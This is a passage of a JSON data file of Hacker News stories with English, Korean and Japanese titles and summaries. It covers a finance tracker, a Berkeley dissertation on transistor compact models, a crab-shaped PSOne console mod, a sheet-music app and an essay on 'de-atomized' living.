      "en": "**WYGIWYH Summary**\n\nWYGIWYH (What You Get Is What You Have) is a simple and effective finance tracker for people who want an easy way to manage their money without budgeting. It focuses on using your current month's earnings for expenses, treating any savings as untouchable for future use.\n\n**Key Features:**\n- **Unified Transaction Tracking:** Keep all income and expenses in one place.\n- **Multi-Account Support:** Track money across various accounts like banks and investments.\n- **Multi-Currency Management:** Handle transactions in different currencies easily.\n- **Custom Currencies:** Create currencies for rewards points or cryptocurrencies.\n- **Automated Adjustments:** Use rules to modify transactions automatically.\n- **Dollar-Cost Average Tracker:** Useful for tracking regular investments in stocks or crypto.\n- **API Support:** Integrate with other services for automation.\n\n**Usage Instructions:**\nTo use WYGIWYH, you need Docker. After setting up the necessary files and configurations, you can run the application and create an admin account.\n\n**Caveats:**\n- The creator is not a financial expert, so some calculations may be off.\n- The app is not designed for budgeting or double-entry accounting. \n\n**Built With:**\nWYGIWYH utilizes various open-source tools, including Django, PostgreSQL, and Bootstrap, to enhance its functionality.",
      "ko": "WYGIWYH(당신이 얻는 것이 당신이 가진 것이다)는 예산 없이 쉽게 돈을 관리하고 싶은 사람들을 위한 간단하고 효과적인 재무 추적기입니다. 이 앱은 현재 달의 수입을 지출에 사용하는 데 중점을 두며, 저축은 미래 사용을 위해 손대지 않는 것으로 간주합니다.\n\n주요 기능으로는 모든 수입과 지출을 한 곳에서 관리할 수 있는 통합 거래 추적, 은행 및 투자와 같은 다양한 계좌에서 돈을 추적할 수 있는 다중 계좌 지원, 여러 통화로 거래를 쉽게 처리할 수 있는 다중 통화 관리, 보상 포인트나 암호화폐를 위한 사용자 정의 통화 생성, 규칙을 사용해 거래를 자동으로 수정하는 자동 조정 기능, 정기적인 주식이나 암호화폐 투자 추적에 유용한 달러 비용 평균 추적기, 다른 서비스와의 통합을 위한 API 지원이 있습니다.\n\nWYGIWYH를 사용하려면 Docker가 필요합니다. 필요한 파일과 설정을 마친 후 애플리케이션을 실행하고 관리자 계정을 만들 수 있습니다.\n\n주의할 점은 이 앱의 제작자가 금융 전문가가 아니기 때문에 일부 계산이 정확하지 않을 수 있다는 것입니다. 또한 이 앱은 예산 관리나 복식 부기용으로 설계되지 않았습니다.\n\nWYGIWYH는 Django, PostgreSQL, Bootstrap 등 다양한 오픈 소스 도구를 활용하여 기능을 향상시키고 있습니다.",
      "ja": "WYGIWYH（ワイギワイエイチ）は、予算を立てずにお金を管理したい人のためのシンプルで効果的なファイナンストラッカーです。このアプリは、今月の収入を使って支出を管理し、貯蓄は将来のために手を付けないものとして扱います。\n\n主な機能には、すべての収入と支出を一元管理できるトランザクション追跡、銀行や投資など複数の口座をサポートする機能、異なる通貨での取引を簡単に扱えるマルチ通貨管理、ポイントや暗号通貨のためのカスタム通貨作成、ルールを使って自動的にトランザクションを調整する機能、定期的な株式や暗号通貨への投資を追跡するためのドルコスト平均追跡機能、他のサービスとの統合を可能にするAPIサポートがあります。\n\nWYGIWYHを使用するには、Dockerが必要です。必要なファイルと設定を整えた後、アプリケーションを実行し、管理者アカウントを作成することができます。\n\n注意点として、開発者は金融の専門家ではないため、計算に誤りがある場合があります。また、このアプリは予算管理や複式簿記には対応していません。\n\nWYGIWYHは、Django、PostgreSQL、Bootstrapなどのさまざまなオープンソースツールを活用して機能を向上させています。"
    }
  },
  {
    "id": "dfcf703c332dca61",
    "title": {
      "en": "Mathematical Compact Models of Advanced Transistors [pdf]",
      "ko": "첨단 트랜지스터 수학 모델",
      "ja": "先進トランジスタの数理モデル"
    },
    "type": "story",
    "url": "https://www2.eecs.berkeley.edu/Pubs/TechRpts/2018/EECS-2018-24.pdf",
    "score": 79,
    "by": "nill0",
    "time": 1743231488,
    "content": "Mathematical Compact Models of Advanced Transistors for Numerical Simulation and Hardware Design  Juan Duarte Electrical Engineering and Computer Sciences University of California at Berkeley  Technical Report No. UCB/EECS-2018-24 http://www2.eecs.berkeley.edu/Pubs/TechRpts/2018/EECS-2018-24.html  May 2, 2018\n\nCopyright © 2018, by the author(s). All rights reserved.  Permission to make digital or hard copies of all or part of this work for personal or classroom use is granted without fee provided that copies are not made or distributed for profit or commercial advantage and that copies bear this notice and the full citation on the first page. To copy otherwise, to republish, to post on servers or to redistribute to lists, requires prior specific permission.\n\nMathematical Compact Models of Advanced Transistors for Numerical Simulation and Hardware Design  by Juan Pablo Duarte Sepulveda A dissertation submitted in partial satisfaction of the requirements for the degree of Doctor of Philosophy in Engineering - Electrical Engineering and Computer Sciences in the Graduate Division of the University of California, Berkeley Committee in charge: Dr. Chenming Hu, Chair Dr. Ali M. Niknejad Dr. Tarek Zohdi Spring 2018\n\nMathematical Compact Models of Advanced Transistors for Numerical Simulation and Hardware Design Copyright   c ©   2018 by Juan Pablo Duarte Sepulveda\n\n1  Abstract  Mathematical Compact Models of Advanced Transistors for Numerical Simulation and Hardware Design by Juan Pablo Duarte Sepulveda Doctor of Philosophy in Engineering - Electrical Engineering and Computer Sciences University of California, Berkeley Dr. Chenming Hu, Chair Mathematical compact models play a key role in designing integrated circuits. They serve as a medium of information exchange between foundries and designers.   A compact model, which is a set of long mathematical equations based on the physics of each transistor, is capable of reproducing the very complex transistor characteristics in an accurately, fast, and robust manner. This dissertation presents the latest research on compact models for advanced transistor technologies: FinFETs, Ultra-thin body SOIs (UTBSOIs), Gate-All-Around (GAA) FETs, and Negative Capacitance (NC) FETs. Since traditional transistor scaling had reached limitations due short-channel effects and oxide tunneling, the introduction of FinFET and UTBSOIs in high-volume manufacturing at 20nm, 14nm and 10nm technology nodes had let the electronic industry to keep obtaining performance and density advantages in technology scaling. For smaller nodes such as 5nm, and 3nm, GAA FETs transistors are expected to replace traditional transistors.   Production ready compact model for current and future FinFETs are presented in this thesis. The Unified Compact Model can model FinFETs with realistic fin shapes including rectangle, triangle, circle and any shape in between. A new quantum effects model will also be presented, it enables accurate modeling of III-V FinFETs. Shape agnostic short-channel effect model for aggressive  L G   scaling and body bias model for FinFETs on bulk substrates are also included in this work.   This computationally efficient model is an ideal turn-key solution for simulation and design of future heterogeneous circuits. For extremely scaled technologies, NC-FETs are quickly emerging as preferred candidates for digital and analog applications. The recent discovery of ferroelectric (FE) materials using conventional CMOS fabrication technology has led to the first demonstrations of FE based NC-FETs. The ferroelectric material layer added over the transistor gate insulator help in several device aspects, it suppress short-channel effects, increase on-current due voltage amplification, increase output resistance in short-channel devices, etc.   These exciting characteristics has created an urgency\n\n2 for analysis and understanding of device operation and circuit performance, where numerical simulation and compact models are playing a key role. This thesis gives insights into the device physics and behavior of FE based nega- tive capacitance FinFETs (NC-FinFETs) by presenting numerical simulations, com- pact models, and circuit evaluation of these devices. NC-FinFETs may have a floating metal between FE and the dielectric layers, where a lumped charge model represents such a device.   For a NC-FinFET without a floating metal, the distributed charge model should be used, and at each point in the channel the FE layer will impact the local channel charge.   This distributed effect has important implications on device characteristics.   These device differences are explained using numerical simulation and correctly captured by the proposed compact models.   The presented compact models have been implemented in commercial circuit simulators for exploring circuits based on NC-FinFET technology.   Circuit simulations show that a quasi-adiabatic mechanism of the ferroelectric layer in the NC-FinFET recovers part of the energy during the switching process of transistors, helping to minimize the energy losses of the wasteful energy dissipation nature of conventional transistor circuits. As circuit load capacitances further increase,   V DD   scaling becomes more dominant on energy reduction of NC-FinFET based circuits.\n\ni To my family: Past, Present and Future.\n\nContents  Contents   ii List of Figures   v List of Tables   xvi 1   Introduction   1  1.1   Mathematical Models for FinFETs and UTBSOIs   . . . . . . . . . . .   3 1.2   Negative Capacitances FETs . . . . . . . . . . . . . . . . . . . . . . .   6  2   Model for Double-Gate FinFETs   10  2.1   Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   10 2.2   Model Derivation   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   12 2.3   Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   18  3   Unified FinFET Compact Model   19  3.1   Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   19 3.2   Core Model   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   20 3.3   Global Scaling Model   . . . . . . . . . . . . . . . . . . . . . . . . . .   30 3.4   Speed Results . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   33 3.5   Benchmark Tests   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   33 3.6   Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   33  4   Variability Modeling   38  4.1   Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   38 4.2   Description of the Unified Model   . . . . . . . . . . . . . . . . . . . .   39 4.3   Device Simulation and Model Parameter Set Up . . . . . . . . . . . .   41 4.4   10nm vs. 14nm Variability Using Predictive Modeling   . . . . . . . .   41 4.5   14nm Node SRAM Variability Evaluation   . . . . . . . . . . . . . . .   44 4.6   Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   45\n\niii  5   Model for Independent Gate MOSFETs   49  5.1   Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   49 5.2   Independent Multi-Gate MOSFETs . . . . . . . . . . . . . . . . . . .   50 5.3   Core Model   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   52 5.4   Initial Guess . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   55 5.5   Iteration Update   . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   59 5.6   Complete Model . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   63 5.7   Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   63  6   Model for Negative Capacitance FETs   67  6.1   Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   67 6.2   Unified Compact Model   . . . . . . . . . . . . . . . . . . . . . . . . .   67 6.3   Ferroelectric Material Model . . . . . . . . . . . . . . . . . . . . . . .   68 6.4   Lumped NC-FinFET Model   . . . . . . . . . . . . . . . . . . . . . . .   70 6.5   Distributed NC-FinFET Model   . . . . . . . . . . . . . . . . . . . . .   71 6.6   Lumped versus Distributed NC-FinFETs . . . . . . . . . . . . . . . .   76 6.7   Time-Dependent Ferroelectric Model   . . . . . . . . . . . . . . . . . .   76 6.8   Model Robustness . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   78 6.9   Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   78  7   Numerical Simulation of Negative Capacitance FETs   81  7.1   Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   81 7.2   Quasi 2-Dimensional NC-FET Simulation . . . . . . . . . . . . . . . .   82 7.3   NC-FET   L G   Scaling   . . . . . . . . . . . . . . . . . . . . . . . . . . .   83 7.4   NC-FET with Low Coercive Field: lowering effective EOT   . . . . . .   86  8   Energy Analysis of Negative Capacitance FETs   93  8.1   Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   93 8.2   SPICE Model for NCFETs . . . . . . . . . . . . . . . . . . . . . . . .   94 8.3   Single NC-FinFET Energy Simulation Analysis   . . . . . . . . . . . .   95 8.4   NC-FinFET Ring-Oscillator Analysis   . . . . . . . . . . . . . . . . . .   99 8.5   Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   104  9   Summary   106  9.1   Chapters Summary . . . . . . . . . . . . . . . . . . . . . . . . . . . .   106 9.2   Future Work . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .   107  A   1D Numerical Simulation of Symmetric FinFET   117 B   Explicit Surface Potential Model   121  B.1   Continuous Starting Function   . . . . . . . . . . . . . . . . . . . . . .   121 B.2   Quartic Modified Iteration: Implementation and Evaluation   . . . . .   124\n\niv  C   Unified Model Implementation in Verilog-A   130 D   1D Numerical Simulation for UTBSOIs   132 E   Energy Calculation with Hspice   137",
    "summary": {
      "en": "The dissertation \"Mathematical Compact Models of Advanced Transistors for Numerical Simulation and Hardware Design\" by Juan Duarte explores the development of compact models for advanced transistors used in integrated circuit design. These models are essential for communication between semiconductor manufacturers and circuit designers, facilitating the simulation of complex transistor behavior.\n\nKey points include:\n\n1. **Importance of Compact Models**: These mathematical models help accurately and efficiently simulate the characteristics of various types of advanced transistors, such as FinFETs, Ultra-thin body SOIs, and Negative Capacitance FETs.\n\n2. **Advancements in Transistor Technology**: As traditional transistors face limitations, new technologies like FinFETs and UTBSOIs are being used in manufacturing for smaller technology nodes (20nm, 14nm, 10nm). GAA FETs are anticipated to become the standard for even smaller nodes (5nm, 3nm).\n\n3. **Unified Compact Model**: The dissertation introduces a comprehensive model for FinFETs that accommodates various fin shapes and includes methods for accurately modeling quantum effects and short-channel behaviors.\n\n4. **Negative Capacitance FETs**: These emerging devices utilize ferroelectric materials to enhance performance, such as reducing short-channel effects and improving energy efficiency. The dissertation provides insights into the physics and simulation of these devices.\n\n5. **Numerical Simulations and Circuit Evaluations**: The proposed models have been implemented in commercial circuit simulators, demonstrating their potential to improve energy efficiency in circuits, particularly as device sizes decrease.\n\nOverall, the work aims to contribute to the understanding and application of advanced transistor technologies in future electronic designs.",
      "ko": "후안 두아르트의 논문 \"수치 시뮬레이션 및 하드웨어 설계를 위한 고급 트랜지스터의 수학적 압축 모델\"은 집적 회로 설계에 사용되는 고급 트랜지스터의 압축 모델 개발을 다룹니다. 이러한 모델은 반도체 제조업체와 회로 설계자 간의 원활한 소통을 위해 필수적이며, 복잡한 트랜지스터 동작을 시뮬레이션하는 데 도움을 줍니다.\n\n압축 모델의 중요성이 강조됩니다. 이러한 수학적 모델은 FinFET, 초박형 SOI, 음전하 커패시턴스 FET와 같은 다양한 고급 트랜지스터의 특성을 정확하고 효율적으로 시뮬레이션하는 데 기여합니다. 전통적인 트랜지스터가 한계를 겪고 있는 가운데, FinFET와 UTBSOI와 같은 새로운 기술이 더 작은 기술 노드(20nm, 14nm, 10nm) 제조에 사용되고 있습니다. GAA FET는 더 작은 노드(5nm, 3nm)에서 표준이 될 것으로 예상됩니다.\n\n이 논문은 다양한 핀 모양을 수용할 수 있는 FinFET에 대한 포괄적인 모델을 소개하며, 양자 효과와 짧은 채널 동작을 정확하게 모델링하는 방법도 포함되어 있습니다. 음전하 커패시턴스 FET는 성능을 향상시키기 위해 강유전 물질을 활용하여 짧은 채널 효과를 줄이고 에너지 효율성을 개선합니다. 이 논문은 이러한 장치의 물리학과 시뮬레이션에 대한 통찰을 제공합니다.\n\n제안된 모델은 상용 회로 시뮬레이터에 구현되어, 장치 크기가 줄어들수록 회로의 에너지 효율성을 개선할 수 있는 가능성을 보여줍니다. 이 연구는 향후 전자 설계에서 고급 트랜지스터 기술의 이해와 적용에 기여하는 것을 목표로 하고 있습니다.",
      "ja": "フアン・デュアルテの論文「数値シミュレーションとハードウェア設計のための先進トランジスタの数学的コンパクトモデル」では、集積回路設計に使用される先進トランジスタのためのコンパクトモデルの開発について探求しています。これらのモデルは、半導体メーカーと回路設計者の間のコミュニケーションを円滑にし、複雑なトランジスタの挙動をシミュレーションするために不可欠です。\n\n重要なポイントとして、まずコンパクトモデルの重要性があります。これらの数学的モデルは、FinFETや超薄型ボディSOI、負キャパシタンスFETなど、さまざまなタイプの先進トランジスタの特性を正確かつ効率的にシミュレーションするのに役立ちます。\n\n次に、トランジスタ技術の進展について触れます。従来のトランジスタには限界があるため、FinFETやUTBSOIのような新しい技術が、20nm、14nm、10nmといった小さな技術ノードの製造に使用されています。さらに、GAA FETは、5nmや3nmといったさらに小さなノードの標準になると期待されています。\n\n論文では、さまざまなフィン形状に対応したFinFETの包括的なモデルが紹介されており、量子効果や短チャネル挙動を正確にモデル化する方法も含まれています。\n\n負キャパシタンスFETについても言及されています。これらの新しいデバイスは、強誘電体材料を利用して性能を向上させ、短チャネル効果を軽減し、エネルギー効率を改善します。論文では、これらのデバイスの物理学とシミュレーションについての洞察が提供されています。\n\n最後に、提案されたモデルは商業用回路シミュレーターに実装されており、特にデバイスサイズが小さくなるにつれて、回路のエネルギー効率を向上させる可能性が示されています。この研究は、将来の電子設計における先進トランジスタ技術の理解と応用に貢献することを目指しています。"
    }
  },
  {
    "id": "8478d3ea38c43dc0",
    "title": {
      "en": "Playstation Mod Turns the PSOne into a Crustacean",
      "ko": "PS원, 갑각류로 변신!",
      "ja": "PSOneが甲殻類に！"
    },
    "type": "story",
    "url": "https://gizmodo.com/the-carcinisation-of-playstation-is-complete-say-hello-to-playstacean-2000579934",
    "score": 101,
    "by": "ulrischa",
    "time": 1742905800,
    "content": "The Carcinisation of PlayStation Is Complete: Say Hello to ‘Playstacean’\n\n        Playstacean is a moddified PSOne, and it’s already clawing its way into our hearts.\n\n    By\n\n      Kyle Barr\n\n      Published March 25, 2025\n\n    |\n\n      Comments (5)\n\n      |\n\n    𝕏\n\n    Copied!\n\n                    © GingerOfOz\n\n              If you thought your PlayStation 5 already looks a little too animalistic with its massive whale fin-like console covers, perhaps you would enjoy a more explicitly aquatic Sony gaming machine. “Playstacean” is more than a pun, it’s a meme that’s transformed into an actual console, and it may be the cutest, working version of Sony’s long-defunct PSOne in the 25 years since its initial launch. Playstacean is, in essence, an all-in one console mod for the PSOne console that’s made to look like a crab. If you ever heard the memeified term “carcinisation,” then this is the crabbiest version of a console we’ve seen yet. Yes, it plays games, and you bet those crab claw controllers actually work. Just don’t imagine you can hold each controller end for too long before your own hands feel like calcified pincers. <iframe title=\"I Built A &quot;Playstacean&quot;\" width=\"500\" height=\"281\" src=\"https://www.youtube.com/embed/dSBNs3TeINc?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" referrerpolicy=\"strict-origin-when-cross-origin\" allowfullscreen></iframe>\n\n    (new Image()).src = 'https://capi.connatix.com/tr/si?token=92b7b46b-43ed-4e0e-b21b-2c999302d9d7&cid=872d12ce-453b-4870-845f-955919887e1b';  cnx.cmd.push(function() {    cnx({      playerId: \"92b7b46b-43ed-4e0e-b21b-2c999302d9d7\"    }).render(\"54612ab9a0fa4d14bdc41e22140d69fb\");  });\n  The design was based on the work of video game concept artist Anh Dang. While you may imagine the smooth curves and inward-sloped mandibles were designed off the original PlayStation console, it’s actually formed from the PSOne, a more-compact version of Sony’s original console that first debuted in 2000 (after the launch of the PlayStation 2). Dang told GingerOfOz that her concept originally came from an old meme she saved to her hard drive years ago. The “Playstacean” console is a meme built off a meme, built off a meme. In a video interview with Gizmodo, GingerofOz told us he had been planning this design after seeing a print of Dang’s artwork late last year. According to the YouTuber, “[Playstacean] is a really good pun. Plus Dang really nailed her original artwork. You could tell immediately that it’s supposed to be a PSOne.” He added, “I think people like crabs… the console hit this really cool niche.” The actual design process began in December, involving a fair bit of trial and error to make a solid and smooth print of the pun-console’s shell. GingerOfOz started the design in CAD and then 3D printed the parts.\n\n  \t\t\t \t\t\t\t \t\t\t \t\t\t\t \t\t\t\t© GingerOfOz \t\t\t\t \t\t\t \t\t\t\t \t\t\t \t\t\t\t \t\t\t\t© GingerOfOz \t\t\t\t \t\t\t \t\t\t\t \t\t\t \t\t\t\t \t\t\t\t© GingerOfOz \t\t\t\t \t\t\t \t\t\t\t \t\t\t \t\t\t\t \t\t\t\t© GingerOfOz \t\t\t\t \t\t\t \t\t\t\t \t\t\t \t\t\t\t \t\t\t\t© GingerOfOz \t\t\t\t \t\t\t \t\t\t\t \t\t\t \t\t\t\t \t\t\t\t© GingerOfOz \t\t\t\t \t\t  Unlike some more dramatic mods like console-to-handheld DIY projects that require precise modifications to the motherboard, GingerofOz only needed to cut down the grounding (which normally protects components from unexpected electrical spikes that can damage the case)around the perimeter of the board to get it seated in the shallow base. While the board itself was relatively simple, he said one of the most-complicated aspects of the build was the work angling the front controller and memory card ports to mirror Dang’s original design. That involved “a solid week and a half of work” involving trial and error. The other struggle was with the controllers themselves. GingerofOz used a modified third-party PlayStation controller he bought off eBay, which resulted in some trial and error before he realized the controller would “freak out” when you detached the thumbsticks from the buttons. The two controllers speak to each other via a switcher soldered to the mainboard, allowing each end to act as one with practically no latency.\n\n GingerOfOz admitted the current iteration has flaws. While constructing the final build, the Playstacean designer had to add knobs to seat the disc drive to avoid any grinding when pressing on the lid. He also admitted his wiring through the controllers wasn’t particularly stellar, but it was good enough to avoid any tangled cables when moving the joints of the crab claws around. Gizmodo asked if he plans to release his files so other modders could 3D print their own Playstacean, but he said he’s not planning to share anything currently. He said the big hurdle is fixing up the current CAD files, and he’s currently more keen to start work on future projects. He will be bringing Playstacean to the Midwest Gaming Classic in Milwaukee, Wisconsin April 4, if you happen to be in town. As for what’s next, he said he considered making a folding Nintendo Switch, though that may be on the backburner now that the Switch 2 is imminent. The modder also hinted he’s working on another aquatic animal-themed console mod, this time for the Nintendo Gamecube. Perhaps we could find a box jellyfish version of Nintendo’s console with a carrying handle.\n\n    PlayStation 5Sony\n\n                  Daily Newsletter\n\n                  (function() {\n\twindow.mc4wp = window.mc4wp || {\n\t\tlisteners: [],\n\t\tforms: {\n\t\t\ton: function(evt, cb) {\n\t\t\t\twindow.mc4wp.listeners.push(\n\t\t\t\t\t{\n\t\t\t\t\t\tevent   : evt,\n\t\t\t\t\t\tcallback: cb\n\t\t\t\t\t}\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\t}\n})();\n\n          Get the best tech, science, and culture news in your inbox daily.\n\n          Select\n\n          News from the future, delivered to your present.\n\n          Select\n\n      Please select your desired newsletters and submit your email to upgrade your inbox.\n\n    Sign me up\n\nLeave this field empty if you're human:\n\n            You May Also Like\n\n            io9Movies\n\n          Nintendo Just Revealed the Zelda Movie’s Release Date in the Most Nintendo Way Possible\n\n          Wes Ball's live-action Legend of Zelda movie will hit theaters March 26, 2027.\n\n    By\n\n      James Whitbrook\n\n      Published March 28, 2025\n\n            io9Movies\n\n          The Resident Evil Reboot Found Someone Who Certainly Looks Like Leon S. Kennedy\n\n          Austin Abrams may be the first actor in Zach Cregger's new Resident Evil movie. Might he be playing Raccoon City's unluckiest rookie cop?\n\n    By\n\n      Justin Carter\n\n      Published March 22, 2025\n\n            Tech NewsArtificial Intelligence\n\n          Hey Sony, There’s a Right Way and Wrong Way to Use AI to Improve PlayStation 5 Games\n\n          AI NPCs aren’t the future for PlayStation 5, but you know what is? Improved AI upscaling.\n\n    By\n\n      Kyle Barr\n\n      Published March 11, 2025\n\n            Tech NewsArtificial Intelligence\n\n          Sony Says It Has Already Taken Down More Than 75,000 AI Deepfake Songs\n\n          AI generated songs that mimic real artists are becoming a serious problem.\n\n    By\n\n      Thomas Maxwell\n\n      Published March 10, 2025\n\n            io9\n\n          Demon Slayer‘s Final End Begins in the U.S. This September\n\n          Demon Slayer: Kimetsu no Yaiba Infinity Castle is the first of the anime's film trilogy finale.\n\n    By\n\n      Isaiah Colbert\n\n      Published March 5, 2025\n\n            io9Movies\n\n          Madame Web‘s Love Language Is Hitting People With Cars\n\n          One year on, and there's still two things I love about Madame Web as much as it loves itself: stolen vehicles, and hitting people with those stolen vehicles.\n\n    By\n\n      James Whitbrook\n\n      Published February 14, 2025\n\n    Latest news\n\n              Crowds Turn Out Across the U.S. for ‘Tesla Takedown’ Protests\n\n              Stay Invisible Online: The Must-Have VPN for Ultimate Privacy\n\n              Scott Derrickson Adapting Horror Novel Road of Bones for Film\n\n              Lanterns‘ Director Teases the HBO Show’s Tone and ‘Sci-Fi Magic’\n\n              Ryan Coogler Wants Denzel for Black Panther 3 As Much as You Do\n\n              Mission: Impossible Is Accepting a Museum Spotlight\n\n              The New Apple Watch Series 10 Has Never Been So Cheap, Amazon Shows No Mercy\n\n              How to Watch MotoGP Americas MotoGP on a Free Channel\n\n  Latest news\n\n            Crowds Turn Out Across the U.S. for ‘Tesla Takedown’ Protests\n\n            3/29/2025, 7:23 pm\n\n            Stay Invisible Online: The Must-Have VPN for Ultimate Privacy\n\n            3/29/2025, 6:00 pm\n\n            Scott Derrickson Adapting Horror Novel Road of Bones for Film\n\n            3/29/2025, 4:15 pm\n\n            Lanterns‘ Director Teases the HBO Show’s Tone and ‘Sci-Fi Magic’\n\n            3/29/2025, 2:50 pm\n\n  Latest Reviews\n\n            The Hypershell Exoskeleton Is So Good at Climbing Cliffs, It Ruined My Workout\n\n            3/29/2025, 9:00 am\n\n            Razer Blade 16 Review: A Toasty Powerhouse\n\n            3/28/2025, 3:15 pm\n\n            Assassin’s Creed Shadows Shows Ubisoft Still Hasn’t Made Assassin’s Creed\n\n            3/18/2025, 1:00 pm\n\n            The Atari Asteroids Watch Is So Beautiful, I Don’t Care How Poorly It Tells Time\n\n            3/14/2025, 7:00 am",
    "summary": {
      "en": "A new gaming console called \"Playstacean,\" a modified version of the PSOne, has gained attention for its unique crab-like design. This console is a playful take on the concept of \"carcinisation,\" where creatures evolve to have crab-like features. The Playstacean not only looks cute but also functions as a gaming device with working crab claw controllers. \n\nThe design was inspired by concept artist Anh Dang and created by modder GingerOfOz, who used 3D printing to bring the idea to life. While crafting the console involved some challenges, such as adjusting controller ports and ensuring smooth functionality, the final product is a charming homage to both the PSOne and crabs.\n\nGingerOfOz plans to showcase the Playstacean at the Midwest Gaming Classic and is considering future projects, including another aquatic-themed console. However, he currently has no plans to share the design files for others to replicate.",
      "ko": "새로운 게임 콘솔인 \"플레이스테이션\"이 독특한 게 모양의 디자인으로 주목받고 있다. 이 콘솔은 생물들이 게와 같은 특징으로 진화하는 개념인 '게화(carcinisation)'를 재미있게 표현한 것이다. 플레이스테이션은 귀여운 외모뿐만 아니라 실제로 작동하는 게 집게 컨트롤러를 갖춘 게임 장치로도 기능한다.\n\n디자인은 개념 아티스트인 앤 당이 영감을 주었고, 모드 제작자인 진저오프오즈가 3D 프린팅 기술을 이용해 아이디어를 실현했다. 콘솔 제작 과정에서는 컨트롤러 포트를 조정하고 원활한 기능을 보장하는 등의 어려움이 있었지만, 최종 제품은 PSOne과 게를 모두 기념하는 매력적인 작품으로 탄생했다.\n\n진저오프오즈는 플레이스테이션을 미드웨스트 게임 클래식에서 선보일 계획이며, 미래 프로젝트로 또 다른 수중 테마의 콘솔을 고려하고 있다. 그러나 현재로서는 다른 사람들이 디자인 파일을 복제할 수 있도록 공유할 계획은 없다.",
      "ja": "新しいゲームコンソール「プレイステイシャン」が注目を集めています。このコンソールはPSOneを改造したもので、カニのようなユニークなデザインが特徴です。「カニ化」という生物の進化の概念を楽しく表現したもので、見た目が可愛いだけでなく、実際に動作するカニのハサミ型コントローラーを備えたゲームデバイスでもあります。\n\nデザインはコンセプトアーティストのアン・ダンによってインスパイアされ、モッダーのジンジャー・オブ・オズが3Dプリンティングを使って実現しました。コンソールの製作にはコントローラーポートの調整やスムーズな機能性の確保など、いくつかの課題がありましたが、最終的にはPSOneとカニへの魅力的なオマージュとなっています。\n\nジンジャー・オブ・オズは、ミッドウエスト・ゲーミング・クラシックでプレイステイシャンを展示する予定で、将来的には別の水中テーマのコンソールを考えているそうです。しかし、現時点では他の人が複製できるようにデザインファイルを共有する予定はないとのことです。"
    }
  },
  {
    "id": "36ae4d7b311c70ac",
    "title": {
      "en": "Show HN Pianoboi – displays sheet music as you play your piano",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://pianoboi.site",
    "score": 102,
    "by": "bcowde",
    "time": 1743177317,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3e20e68ce8fa1036",
    "title": {
      "en": "De-Atomization Is the Secret to Happiness (2022)",
      "ko": "행복의 비밀, 분자 해체",
      "ja": "原子解放が幸せの鍵"
    },
    "type": "story",
    "url": "https://www.nateliason.com/blog/de-atomization-is-the-secret-to-happiness",
    "score": 50,
    "by": "handfuloflight",
    "time": 1743284836,
    "content": "De-Atomization is the Secret to HappinessNovember\t7, 2022\nThere are at least two kinds of fun:\nType 1 fun is fun in the moment. Watching a movie, playing a video game, scrolling TikTok, reading a book. You want to have fun, you do the fun thing, and voilá, it is fun.\nType 2 fun is fun in retrospect. Running a marathon is mostly un-fun from moment to moment; you’re often either zoned out or in some form of pain. But in retrospect, it was fun.\nI’ve spent over 1,000 hours playing the video game DOTA 2, but I remember almost zero of that time. It was strong type 1 fun but very low type 2 fun.\nI once went to a DOTA 2 International tournament with a friend, though, and I remember most of that experience quite vividly. Significant parts were unfun: waiting in line, commuting to the arena, bumping into one of the questionably hygienic gamers whose body must be 63% pizza and getting a whiff of Geneva-violating body odor. But overall, it was very fun.\nDespite being moment-to-moment less fun than playing the game, going to the tournament was ultimately more fun. Playing the videogame is very fun, but it’s monolithic. It’s just play, there’s no environmental novelty full of multisensory stimuli to hook your memory into. It blurs from one moment to the next, and like bad American Chinese food, you find yourself paradoxically unsatiated when you’re done. There’s something more fun about complex fun, even if the individual moments might score lower on the hedonometer.\nBut fun is just one area where we can see this phenomenon. There is a clear experiential divide between rich multisensory life and what I’ll call “atomized” life.\nAnd atomized life is worth avoiding.\nII\nWhen I wrote about how much weaker we’ve gotten, several people rightly pointed out that the reason was obvious: most of us no longer do hard labor as our day jobs. When you had to walk or jog 20 miles a day for sustenance or spend all day carrying canoes and packs on your shoulders or drag bricks of limestone around for pharaoh, you were default strong. When you spend all day sitting in a chair getting enraged / entertained / aroused / whatever by algorithms, you are default flabby.\nLife and fitness used to be deeply intertwined. You could not live without fitness. Now they are separate: fitness is a cute thing rich people do in their Lululemon after work or while jiggling their mouse to keep the Slack bubble green. You don’t do it to stay alive, you do it to get laid or not resent yourself or maybe if you’re particularly enlightened to “feel good.”\nFitness has been atomized: it is no longer part of a cohesive whole life. It’s a separate thing you have to try to “find time for.” When someone says they “don’t have time” to work out, they’re both stating their priorities (obviously, everyone has time) but also stating something about their life. It does not have fitness incorporated into it.\nBeyond the atomization separating fitness from normal life, there is also further atomization within fitness. Let’s take biking as an example. First, biking was something you did outside, often with friends. There was scenery, socialization, exploration, sunlight, and exercise. Then the 